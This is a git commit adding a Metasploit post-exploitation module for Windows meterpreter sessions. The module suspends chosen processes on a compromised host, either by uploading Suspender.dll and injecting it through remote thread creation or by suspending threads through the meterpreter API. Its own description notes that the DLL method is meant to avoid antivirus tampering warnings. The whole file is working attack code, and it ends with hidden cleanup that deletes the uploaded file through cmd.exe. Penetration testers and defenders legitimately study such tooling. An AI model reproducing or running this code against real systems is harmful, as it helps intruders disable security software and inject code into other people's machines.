5655ec71886fe691b85311c9e91162e1f19ef55e
kernelsmith <kernelsmith@kernelsmith.com>
2012-06-10 23:44:52 -0500

    Converted suspender to suspenders & cleaned up greatly
    Suspenders can suspend multiple processes instead of just one

---
+++ modules/post/windows/manage/suspenders.rb
@@ -0,0 +1,236 @@
+# based on meterpreter script suspender.rb by Kerberos, which is based on mubix' blog post at
+# http://www.room362.com/blog/2011/5/30/remote-dll-injection-with-meterpreter.html which is
+# predicated on Didier Stevens code & blog at http://blog.didierstevens.com/2011/04/27/suspender-dll/
+#
+#
+# TODO:
+# -> x64 support
+
+require 'msf/core'
+#require 'msf/core/post/common'
+
+class Metasploit3 < Msf::Post
+
+	include Msf::Auxiliary::Report
+		#TODO:  Report the process as suspended.
+	
+	def initialize(info={})
+		super( update_info( info,
+				'Name' => 'Suspenders',
+				'Description' => %q{ This module suspends a list of given processes after a given 
+				delay.  This is accomplished one of two ways.  First, Suspender.dll can be injected
+				into the target process.  Second, the meterpreter API can be used to suspend each
+				thread in the target process.  To use the Suspender.dll approach you'll have to 
+				download Suspender.dll (just once), see References for URL.  The module will
+				check for the dll at data/suspender/x86/Suspender.dll when a path is not given.  The
+				minimum delay for the dll method is 1 second and 0 will automatically be increased.
+				The Suspender.dll method currently requires a file upload to the target, however it's 
+				less likely to trigger a "tampering" warning from certain processes (such as AV
+				processes) than the meterpreter API method.  PIDs will be suspended in the order
+				they are listed, and process names, if any, will be translated to pids and appended,
+				in order, to the list of PIDs (however no process will be suspended twice).
+
+				This module is a port of the meterpreter script of the same name by kerberos, which
+				was inspired by mubix's blog which was inpsired by Didier Stevens' Suspender.dll. },
+				'License' => MSF_LICENSE,
+				'Author' => [	'kerberos', # original meterpreter script
+								'kernelsmith' # post module, ability to do multiple processes
+							],
+				'Version' => '$Revision$',
+				'Platform' => [ 'windows' ],
+				'SessionTypes' => [ 'meterpreter' ],
+				'References'     =>
+					[
+						[ 'URL', 'http://blog.didierstevens.com/2011/04/27/suspender-dll/' ],
+						[ 'URL', 'http://www.room362.com/blog/2011/5/30/remote-dll-injection-with-meterpreter.html' ],
+						[ 'URL', 'http://pastebin.com/tTQASf7R' ],
+					]
+		))
+		register_options(
+			[
+				OptString.new('PIDS', [false, 'Target process ID list, comma seperated, to suspend', nil]),
+				OptString.new('PROCESSES', [false, 'Target process names, comma sep, to suspend (this or PIDS must be set)', nil]),
+				OptInt.new('DELAY', [true, 'The delay, in seconds, to wait before suspension', 0]),
+			#	OptBool.new('UNSUSPEND', [false, 'I am not sure this can be implemented',false]),
+				OptBool.new('USE_DLL', [true, 'Do NOT use Suspender.dll, this method might bother AVs',true]),
+				@suspender = OptPath.new('SUSPENDER_DLL', [false, "Local path to the Suspender.dll, req'd if USE_DLL is true", nil]),
+				OptBool.new('HALT', [true, 'Halt further suspension if any failure is encountered', false]),
+			], self.class)
+	end
+
+	def run
+		# validate and assign option values
+		pids = []
+		if (datastore['PIDS'] and not datastore['PIDS'].empty?)
+			pids = pids + datastore['PIDS'].split(',')
+		end
+		processes = []
+		if (datastore['PROCESSES'] and not datastore['PROCESSES'].empty?)
+			processes = processes + datastore['PROCESSES'].split(',')
+		end
+ 
+		delay = datastore['DELAY']
+		if (delay < 1 and datastore['USE_DLL'])
+			print_status "Minimum delay for the DLL method is 1, changing delay to 1"
+			delay = 1
+		end
+		#undo = datastore['UNSUSPEND']
+		tempdir = session.fs.file.expand_path("%TEMP%") || "C:\\"
+		if datastore['USE_DLL']
+			# TODO:  validate this the fancy way using OptPath.valid?
+			if @suspender.valid?(datastore['SUSPENDER_DLL'])
+				suspender = datastore['SUSPENDER_DLL']
+			else
+				susp_path = ::File.join(Msf::Config.data_directory,'suspender','x86','Suspender.dll')
+				if @suspender.valid?(susp_path)
+					suspender = susp_path
+				else
+					raise OptionValidateError.new('SUSPENDER_DLL'),
+					"Could not find Suspender.dll.  A good location to put Suspender.dll is #{susp_path}"
+				end
+			end
+		end
+		uploadpath = "#{tempdir}\\#{Rex::Text.rand_text_alpha((rand(8)+6))}#{delay.to_s}.dll"
+		halt = datastore['HALT']
+
+		# check that pids and/or process names are provided and that pid != 0
+		if ( (pids.empty? or pids.include?(0)) and (processes.empty?) )
+			# suspending PID 0 will eventually bork the box
+			print_error "PIDS and PROCESSES can't both be empty... and PIDS can't be 0"
+			return nil
+		end
+
+		# resolve the pids if nec
+		if ( processes and not processes.empty? ) 
+			print_status "Resolving the process names to PIDs"
+			processes.each do |process|
+				pid = client.sys.process[process] # returns the first process encountered w/this name
+				if ( pid and pid != 0 )
+					pids << pid
+					print_good "Found PID:  #{pid}"
+				else
+					if pid == 0
+						if halt
+							print_error "Found PID 0, halting"
+							return nil
+						else 
+							print_error "Found PID 0, skipping it for your protection"
+						end
+					else
+						if halt
+							print_error "Could not find a process with the name #{process}, halting"
+							return nil
+						else					
+							print_error "Could not find a process with the name #{process}, skipping it"
+						end
+					end
+				end
+			end
+		end
+		
+		# convert all pids to integers to avoid problems down the road and allow a uniq call
+		pids.each_with_index do |pid,idx| 
+			pids[idx] = pid.to_i
+		end
+		# unique'ify the pids
+		pids.uniq!
+
+		# proceed based on which method was chosen
+		if datastore['USE_DLL']
+			suspend_using_dll(pids,delay,uploadpath,suspender)
+		else # use the meterpreter api
+			suspend_using_api(pids,delay)
+		end
+	end
+
+	def suspend_using_api(pids,delay)
+		# http://www.room362.com/blog/2011/5/30/remotely-suspend-all-threads-with-meterpreter.html
+		# "There are a few AVs engines that detected this as tampering. But if your target isn't AV..."
+		targetprocess = nil
+		begin
+			pids.each do |pid|
+				select(nil, nil, nil, delay)
+				print_status "Opening target process:  #{pid}"
+				targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
+				print_status "Suspending threads"
+				targetprocess.thread.each_thread do |x|
+    				targetprocess.thread.open(x).suspend
+				end
+			end
+		rescue ::Rex::Post::Meterpreter::RequestError => e
+			print_error "There was an error suspending the process threads:  #{e.to_s}"
+			print_error "You may not have the correct permissions (PROCESS_ALL_ACCESS)"
+			if halt
+				print_error "Halting."
+				return nil
+			else
+				print_status "Continuing..."
+			end
+		ensure
+			targetprocess.close if targetprocess
+		end
+	end
+	
+	def suspend_using_dll(pids,delay,uploadpath,suspender)
+		begin
+			# Create payload, do this first so we don't have to delete files if this fails
+			print_status("Creating dll injector payload...")
+			pay = client.framework.payloads.create("windows/loadlibrary")
+			pay.datastore['DLL'] = uploadpath
+			pay.datastore['EXITFUNC'] = 'thread'
+			raw = pay.generate
+		rescue RuntimeError => e
+			print_error("Error generating payload #{e.to_s}")
+			return nil
+		end
+		begin
+			# Upload suspender to target
+			print_status "Uploading Suspender to #{uploadpath}, you'll have to remove this " +
+			"manually as it will be in use until the suspended process is killed " + 
+			"by you or by the system/user but I'll try to remove it anyways"
+			session.fs.file.upload_file("#{uploadpath}", "#{suspender}")
+			# TODO:  inject directly into memory instead of uploading first
+		rescue Rex::Post::Meterpreter::RequestError => e
+			print_error "Can't continue, error uploading Suspender.dll:  #{e.to_s}"
+			return nil
+		end
+		# do injects
+		proc = nil
+		pids.each do |pid|
+			begin
+				print_status("Opening process with PID #{pid}...")
+				targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
+				mem = targetprocess.memory.allocate(raw.length + (raw.length % 1024))
+				print_status("Injecting payload")
+				targetprocess.memory.write(mem, raw)
+				print_status("Executing payload")
+				targetprocess.thread.create(mem, 0)
+			rescue Rex::Post::Meterpreter::RequestError => e
+				print_error "Error injecting payload {e.to_s}, you may not have permission"
+				if halt
+					print_error "Halting."
+					return nil
+				else
+					print_error "Continuing..."
+				end
+			ensure
+				# Let's ensure we close the open process if it's open
+				targetprocess.close if targetprocess
+			end
+		end
+		begin # Attempt clean up
+			print_status("Cleaning up what I can, but you'll likely have to delete ")
+			print_line("#{uploadpath} after you kill the suspended process")
+			# in most situations these attempts won't work so we eat the errors raised
+			session.fs.file.rm(uploadpath) # try to remove using API & using a shell
+			#TODO:  put this in a loop so it will keep trying to delete until it succeeds
+			session.sys.process.execute(
+				"cmd.exe /c attrib -r #{uploadpath} && del #{uploadpath}",nil, {'Hidden' => true}
+			)
+		rescue
+			Rex::Post::Meterpreter::RequestError
+			print_status "Could not remove #{uploadpath} as expected"
+		end
+	end
+
+end
